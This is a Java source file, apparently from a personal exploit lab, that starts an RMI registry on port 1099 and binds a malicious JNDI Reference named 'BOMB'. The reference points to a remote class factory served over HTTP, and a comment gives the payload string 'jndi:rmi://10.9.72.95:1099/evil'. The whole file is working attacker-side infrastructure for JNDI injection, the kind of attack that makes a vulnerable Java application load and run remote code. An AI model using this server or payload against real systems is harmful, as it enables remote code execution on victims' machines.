package xyz.clzly.keen;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * jndi:rmi://10.9.72.95:1099/evil
 * */
public class RMIServer {
    public static void main(String[] args)  {
        try {
			//1. 启动RMI注册表，端口设置为1099，不设置默认也为1099
            LocateRegistry.createRegistry(1099);

            //2. 创建本地主机在端口上对远程对象 Registry 的引用
            Registry registry = LocateRegistry.getRegistry();

            //3. 构造一个Reference对象引用，然后将这个恶意的Reference引用绑定到RMI注册中心
            Reference reference = new Reference("Bomb", "Bomb", "http://127.0.0.1:8081");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

            //4. 把远程对象注册到RMI注册服务器上，并命名为BOMB
			registry.bind("BOMB", referenceWrapper);

            System.out.println("成功在1099端口上启动注册表！");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}